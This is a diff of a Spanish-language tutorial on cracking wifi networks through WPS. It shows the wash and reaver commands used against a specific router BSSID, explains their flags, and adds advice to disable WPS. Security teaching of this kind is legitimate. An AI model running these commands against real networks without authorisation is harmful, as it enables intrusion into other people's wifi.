@@ -23,10 +23,14 @@ Usamos el comando **wash** para filtrar los wifi con WPS habilitado.
 >wash -i wlan1mon
 
 ![refresca la página para cargar el imágen](imagen/wps3.png)
-Por lo último ejecutamos el comando **reaver**, viene preinstalado en Kali.
+Por lo último ejecutamos el comando **reaver**, viene preinstalado en Kali. Y esperamos que se termine de encontrar la clave.
 
 >reaver -i wlan1mon -b 24:7F:20:02:63:B6 -vv
 
 ```-i``` Interfaz del wlan.
+
 ```-b``` BSSID del router.
+
 ```-v``` Te indica cada paso lo que está haciendo.
+
+Como podéis ver "hackear" red wifi con WPS es bastante más sencillo intentando descifrar la clave con un diccionario a fuerza. Si no vas a usar WPS, deshabilitalo.
